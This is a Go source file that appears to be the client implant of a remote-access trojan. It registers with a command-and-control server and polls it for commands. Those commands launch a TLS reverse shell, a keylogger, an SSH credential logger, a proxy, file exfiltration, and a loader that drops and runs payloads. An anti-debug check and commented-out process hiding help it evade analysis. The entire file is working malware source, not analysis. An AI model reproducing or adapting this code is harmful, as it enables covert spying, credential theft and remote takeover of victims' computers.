package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"client/antidebug"
	"client/config"
	"client/modules/filetransfer"
	"client/modules/keylogger"
	"client/modules/loader"
	"client/modules/proxy"
	"client/modules/sshlogger"
	"client/modules/systeminfo"
	"client/utils"

	"github.com/chzyer/readline"
)

type CommandPayload struct {
	ClientID string `json:"client_id"`
}

// JSON command structure
type JSONCommand struct {
	Command string                 `json:"command"`
	Args    map[string]interface{} `json:"args"`
}

// Common command completion list
var commonCommands = []readline.PrefixCompleterInterface{
	readline.PcItem("cd"),
	readline.PcItem("pwd"),
	readline.PcItem("echo"),
	readline.PcItem("clear"),
	readline.PcItem("exit"),
	readline.PcItem("cat"),
	readline.PcItem("grep"),
	readline.PcItem("ps"),
	readline.PcItem("kill"),
	readline.PcItem("mkdir"),
	readline.PcItem("rm"),
	readline.PcItem("cp"),
	readline.PcItem("mv"),
	readline.PcItem("chmod"),
	readline.PcItem("chown"),
	readline.PcItem("find"),
	readline.PcItem("wget"),
	readline.PcItem("curl"),
}

/*func unixReverseShell(conn net.Conn, encryptor *StringEncryptor) error {
	cmd := exec.Command("/bin/bash", "-i")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return err
	}
	defer ptmx.Close()

	// Set terminal size
	pty.Setsize(ptmx, &pty.Winsize{
		Rows: 24,
		Cols: 80,
	})

	// Data transfer between PTY and connection
	go func() {
		io.Copy(ptmx, conn)
	}()
	go func() {
		io.Copy(conn, ptmx)
	}()

	return cmd.Wait()
}*/

var httpClient = utils.HTTPClientConfig()

func main() {

	// Anti-debug check
	if config.ANTITECH {
		antiDebug := antidebug.New()
		if antiDebug.Check() {
			os.Exit(0)
		}
	}

	// Process hiding
	/*stealth := stealth.New()
	if err := stealth.Hide(); err != nil {
		// Continue even if there's an error
		//fmt.Printf("Process hiding error: %v\n", err)
		//os.Exit(1)
	}*/

	clientID := utils.GenerateClientID()

	serverURL := fmt.Sprintf("https://%s:%s", config.SERVER_IP, config.SERVER_PORT)
	hostname, err := os.Hostname()
	if err != nil {
		hostname = ""
	}

	client := &Client{
		ClientID: clientID,
		OS:       runtime.GOOS,
		Hostname: hostname,
		BuildID:  config.BUILD_ID,
	}

	/*if err := registerClient(client, serverURL); err != nil {
		fmt.Println("Registration failed:", err)
	} else {
		fmt.Println("Registration successful!")
	}*/

	sendRegisterRequest(client, serverURL)

	go func() {
		for {
			if err := getCommand(clientID, serverURL, httpClient); err != nil {
				log.Printf("Command sending error: %v", err)
			}
			time.Sleep(2 * time.Second)
		}
	}()

	select {}
}

func shell(port string, interactive bool) {

	// Create TLS config
	tlsConfig, err := getTLSConfig()
	if err != nil {
		fmt.Printf("TLS config error: %v\n", err)
		os.Exit(1)
	}

	for {
		// Create TLS connection
		conn, err := tls.Dial("tcp", config.SERVER_IP+":"+port, tlsConfig)
		if err != nil {
			continue
		}

		// Send system information
		hostname, _ := os.Hostname()
		username := os.Getenv("USER")
		if username == "" {
			username = os.Getenv("USERNAME") // For Windows
		}

		info := fmt.Sprintf("[*] Connection successful! (%s@%s)\n", username, hostname)
		conn.Write([]byte(info))

		// Start the appropriate shell based on the OS
		var shellErr error
		if runtime.GOOS == "windows" {
			shellErr = windowsReverseShell(conn, nil)
		} else {
			shellErr = unixReverseShell(conn, interactive, nil)
		}

		if shellErr != nil {
			fmt.Printf("Shell error: %v\n", shellErr)
		}

		conn.Close()
	}
}

func getTLSConfig() (*tls.Config, error) {
	// Get client cert and key
	cert, err := tls.X509KeyPair([]byte(config.CLIENT_CERT), []byte(config.CLIENT_KEY))
	if err != nil {
		return nil, fmt.Errorf("client cert load failed: %v", err)
	}

	// Load CA cert
	rootCAs := x509.NewCertPool()
	if !rootCAs.AppendCertsFromPEM([]byte(config.CA_CERT)) {
		return nil, fmt.Errorf("CA cert load failed")
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      rootCAs,
	}, nil
}

func getDelay(elapsed time.Duration) time.Duration {
	switch {
	case elapsed < 1*time.Minute:
		return 30 * time.Second
	case elapsed < 5*time.Minute:
		return 1 * time.Minute
	case elapsed < 15*time.Minute:
		return 2 * time.Minute
	default:
		return 5 * time.Minute
	}
}

func sendRegisterRequest(client *Client, serverURL string) {
	start := time.Now()
	for {
		err := registerClient(client, serverURL, httpClient)
		if err == nil {
			return
		}

		elapsed := time.Since(start)
		delay := getDelay(elapsed)
		time.Sleep(delay)
	}
}

func registerClient(client *Client, serverURL string, c *http.Client) error {
	payload, err := json.Marshal(client)
	if err != nil {
		return fmt.Errorf("failed to marshal client: %v", err)
	}

	url := fmt.Sprintf("%s/register", serverURL)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return fmt.Errorf("request creation error: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)
	if err != nil {
		return fmt.Errorf("request sending error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration failed, server responded with status: %d", resp.StatusCode)
	}

	return nil
}

func getCommand(clientID string, serverURL string, client *http.Client) error {

	payloadData := CommandPayload{
		ClientID: clientID,
	}

	payload, err := json.Marshal(payloadData)
	if err != nil {
		return fmt.Errorf("failed to marshal command payload: %w", err)
	}

	url := fmt.Sprintf("%s/command", serverURL)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return fmt.Errorf("request creation error: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("request sending error: %w", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response body: %w", err)
	}

	if len(body) > 0 {
		// First try to parse as JSON command
		if strings.HasPrefix(string(body), "{") {
			var jsonCmd JSONCommand
			jsonErr := json.Unmarshal(body, &jsonCmd)

			// If it can be parsed as JSON and has a command field
			if jsonErr == nil && jsonCmd.Command != "" {
				// Process JSON command
				switch jsonCmd.Command {
				case "upload", "download":
					return processFileTransferJSON(jsonCmd)
				default:
					// Use normal command processing logic for other JSON commands
					var cmd Command
					cmd.Command = jsonCmd.Command
					return processCommand(cmd)
				}
			}
		}

		// If it can't be parsed as JSON or doesn't have a command field, try as a normal command
		var commandResponse Command
		if err := json.Unmarshal(body, &commandResponse); err != nil {
			// If it can't be parsed as JSON, accept it as a plain string
			commandStr := string(body)
			if commandStr != "" {
				commandResponse.Command = commandStr
			} else {
				return fmt.Errorf("No command")
			}
		}

		// Process command
		return processCommand(commandResponse)
	}

	return nil
}

// processCommand, processes
func processCommand(cmd Command) error {
	if cmd.Command == "" {
		return nil // Empty command, silently pass
	}

	// Split command and arguments
	parts := strings.Fields(cmd.Command)
	command := parts[0]
	args := parts[1:]

	switch command {
	case "shell":
		//port := config.SHELL_PORT
		port := ""
		interactive := false

		for i := 0; i < len(args); i++ {
			if args[i] == "-port" && i+1 < len(args) {
				port = args[i+1]
			}

			if args[i] == "-i" {
				interactive = true
			}
		}

		// If port parameter is not specified, return error
		if port == "" || port == "0" {
			fmt.Println("Error: Shell port not specified")
		} else {
			go shell(port, interactive)
		}
		//go shell()
	case "systeminfo":
		go systeminfo.Systeminfo()
	case "proxy":
		//args := []string{"socks5", "127.0.0.1", "1080"}
		proxyArgs := args
		go proxy.HandleProxyCommand(proxyArgs...)

	case "sshlogger":
		go sshlogger.SSHLoggerStart()
	case "keylogger":
		go keylogger.Keylogger()
	case "download":
		/*clientFilePath := args[0]
		ft := filetransfer.New()
		if err := ft.Download(clientFilePath); err != nil {
			fmt.Printf("File transfer error: %v\n", err)
		}*/
		downloadPath := ""
		if len(args) > 0 {
			// If there is a quoted path
			if strings.HasPrefix(cmd.Command, "download \"") || strings.HasPrefix(cmd.Command, "download '") {
				// Remove command word
				input := strings.TrimPrefix(cmd.Command, "download ")
				input = strings.TrimSpace(input)

				// Remove quoted path
				var err error
				downloadPath, _, err = extractQuotedPath(input)
				if err != nil {
					// If not quoted, use first argument
					downloadPath = args[0]
				}
			} else {
				// If not quoted, use first argument
				downloadPath = args[0]
			}
		}

		if downloadPath == "" {
			fmt.Printf("Error: Missing file path for download\n")
			return nil
		}

		ft := filetransfer.New()
		if err := ft.Download(downloadPath); err != nil {
			fmt.Printf("File transfer error: %v\n", err)
		}
	case "upload":
		/*
		   var filePath, targetPath string

		   	for i := 0; i < len(args); i++ {
		   		switch args[i] {
		   		case "-file":
		   			if i+1 < len(args) {
		   				filePath = args[i+1]
		   				fmt.Println("File path: ", filePath)
		   				i++
		   			}
		   		case "-path":
		   			if i+1 < len(args) {
		   				targetPath = args[i+1]
		   				fmt.Println("Target path: ", targetPath)
		   				i++
		   			}
		   		}
		   	}

		   ft := filetransfer.New()

		   	if err := ft.Upload(filePath, targetPath); err != nil {
		   		fmt.Printf("File transfer error: %v\n", err)
		   	}
		*/
		// Parse command line
		input := strings.TrimPrefix(cmd.Command, "upload")
		input = strings.TrimSpace(input)

		// Find -file and -path arguments
		sourceFilePath, targetFolderPath := extractCommandPaths(input)

		if sourceFilePath == "" || targetFolderPath == "" {
			fmt.Printf("Usage: upload -file <source_file> -path <target_folder>\n")
			return nil
		}

		ft := filetransfer.New()
		if err := ft.Upload(sourceFilePath, targetFolderPath); err != nil {
			fmt.Printf("File transfer error: %v\n", err)
		}
	case "loader":

		input := strings.TrimPrefix(cmd.Command, "loader")
		input = strings.TrimSpace(input)

		// Find arguments
		sourceFilePath, targetFolderPath := extractCommandPaths(input)

		if sourceFilePath == "" {
			fmt.Printf("Usage: loader -file <source_file> -path <target_folder>\n")
			return nil
		}

		// If target path is not specified, use default value
		if targetFolderPath == "" {
			// Use temporary directory by default
			if runtime.GOOS == "windows" {
				targetFolderPath = os.Getenv("TEMP")
			} else {
				targetFolderPath = "/tmp"
			}
			fmt.Println("Using default target path: ", targetFolderPath)
		}

		l := loader.New()
		if err := l.LoadAndRun(sourceFilePath, targetFolderPath, true); err != nil {
			fmt.Printf("Loader error: %v\n", err)
		}
	default:
		return fmt.Errorf("unknown command: %s", command)
	}

	return nil
}

// processFileTransferJSON, processes file transfer JSON commands
func processFileTransferJSON(cmd JSONCommand) error {
	ft := filetransfer.New()

	switch cmd.Command {
	case "upload":
		// upload command: Upload file from server to client
		serverPath, ok1 := cmd.Args["server_path"].(string)
		clientPath, ok2 := cmd.Args["client_path"].(string)

		if !ok1 || !ok2 {
			return fmt.Errorf("invalid arguments for upload command")
		}

		return ft.Upload(serverPath, clientPath)

	case "download":
		// download command: Download file from client to server
		clientPath, ok1 := cmd.Args["client_path"].(string)

		if !ok1 {
			return fmt.Errorf("invalid arguments for download command: client_path required")
		}

		// Server path is optional
		serverPath, ok2 := cmd.Args["server_path"].(string)
		if ok2 && serverPath != "" {
			// If server path is specified, do a special process
			fmt.Printf("Server path specified: %s\n", serverPath)
		}

		return ft.Download(clientPath)

	default:
		return fmt.Errorf("unknown file transfer command: %s", cmd.Command)
	}
}

func extractQuotedPath(input string) (string, string, error) {
	input = strings.TrimSpace(input)

	if len(input) == 0 {
		return "", "", fmt.Errorf("empty input")
	}

	// Check for quote
	if input[0] != '"' && input[0] != '\'' {
		return "", "", fmt.Errorf("quote not found")
	}

	quoteChar := input[0]

	// Find the closing quote
	endQuoteIndex := -1
	for i := 1; i < len(input); i++ {
		if input[i] == quoteChar && input[i-1] != '\\' {
			endQuoteIndex = i
			break
		}
	}

	if endQuoteIndex == -1 {
		return "", "", fmt.Errorf("closing quote not found")
	}

	// Extract the path
	path := input[1:endQuoteIndex]

	// Return the remaining text
	remaining := ""
	if endQuoteIndex+1 < len(input) {
		remaining = input[endQuoteIndex+1:]
	}

	return path, remaining, nil
}

func extractCommandPaths(input string) (string, string) {
	var filePath, targetPath string

	// Find -file and -path arguments
	fileIndex := strings.Index(input, "-file")
	pathIndex := strings.Index(input, "-path")

	if fileIndex != -1 {
		// Process -file argument
		fileInput := input[fileIndex+5:]
		if pathIndex > fileIndex {
			fileInput = input[fileIndex+5 : pathIndex]
		}
		fileInput = strings.TrimSpace(fileInput)

		// Check for quoted file path
		if strings.HasPrefix(fileInput, "\"") || strings.HasPrefix(fileInput, "'") {
			filePath, _, _ = extractQuotedPath(fileInput)
		} else {
			// Split by space
			parts := strings.SplitN(fileInput, " ", 2)
			if len(parts) > 0 {
				filePath = parts[0]
			}
		}
	}

	if pathIndex != -1 {
		// Process -path argument
		pathInput := input[pathIndex+5:]
		pathInput = strings.TrimSpace(pathInput)

		// Check for quoted target path
		if strings.HasPrefix(pathInput, "\"") || strings.HasPrefix(pathInput, "'") {
			targetPath, _, _ = extractQuotedPath(pathInput)
		} else {
			// Split by space
			parts := strings.SplitN(pathInput, " ", 2)
			if len(parts) > 0 {
				targetPath = parts[0]
			}
		}
	}

	return filePath, targetPath
}
